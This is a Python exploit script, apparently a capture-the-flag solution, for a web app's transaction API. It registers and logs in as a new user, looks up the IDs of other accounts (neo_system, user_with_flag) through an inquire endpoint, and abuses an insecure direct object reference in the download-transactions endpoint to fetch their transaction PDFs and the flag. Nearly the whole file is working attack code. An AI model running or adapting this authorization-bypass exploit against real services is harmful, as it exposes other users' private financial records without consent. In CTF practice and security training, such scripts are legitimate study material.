import requests
import sys

# Ensure correct usage
if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <base_url>")
    sys.exit(1)

base_url = sys.argv[1].rstrip('/')  # Remove trailing slash if present

# Start a session
session = requests.Session()

# Optional: Visit the base URL first (to get cookies if needed)
session.get(base_url)

# Registration endpoint
register_url = f"{base_url}/api/v2/auth/register"

# Registration data
payload = {
    "username": "newuser",
    "email": "newemail@test.com",
    "password": "newnewnew"
}
payloadhe = {
        "Content-Type": "application/json"
}

# Send POST request
response = session.post(register_url, json=payload,headers=payloadhe)

# Output result
print("+++++++++++++++++Register Done Now will switch to login:+++++++++")

loginurl = f"{base_url}/api/v2/auth/login"
login = session.post(loginurl,json=payload)
if login.status_code == 200 :
    print("Login Done")
else:
    "something wrong"
check = f"{base_url}/api/v2/auth/inquire?username=neo_system"
getid = session.get(check)
if getid.status_code == 200:
    print("+++++++++++++++++++ we get the username id of neo_system we see it's on secreen on main page dasboard")
    res = getid.json()
    adminid = res["_id"]
    print(f"our target id is _ {adminid}")
print("So from that we will targeting now /api/v1/transactions/download-transactions but first lets observe something ")
new = f"{base_url}/api/v1/transactions/download-transactions"
r = session.post(new)
print("now check the problem")
t =r.content
print(f"{t}")
print("so we need to proivde id")
new = f"{base_url}/api/v1/transactions/download-transactions"
ids={
    "_id":adminid
}
r = session.post(new,json=ids)
pdf_bytes = r.content  # or whatever variable holds b'%PDF...'
with open("output.pdf", "wb") as f:
    f.write(pdf_bytes)

print("chcek the folder there is new pdf is have usercalled  user_with_flag ")
print("so from that we will start targeting the user with same process above")
check = f"{base_url}/api/v2/auth/inquire?username=user_with_flag"
getid = session.get(check)
res = getid.json()
adminid = res["_id"]
print(f"our target id is _ {adminid} and that will extract us the flag")
new = f"{base_url}/api/v1/transactions/download-transactions"
ids={
    "_id":adminid
}
r = session.post(new,json=ids)
pdf_bytes = r.content  # or whatever variable holds b'%PDF...'
with open("flag.pdf", "wb") as f:
    f.write(pdf_bytes)
print("flag in flag.pdf ")
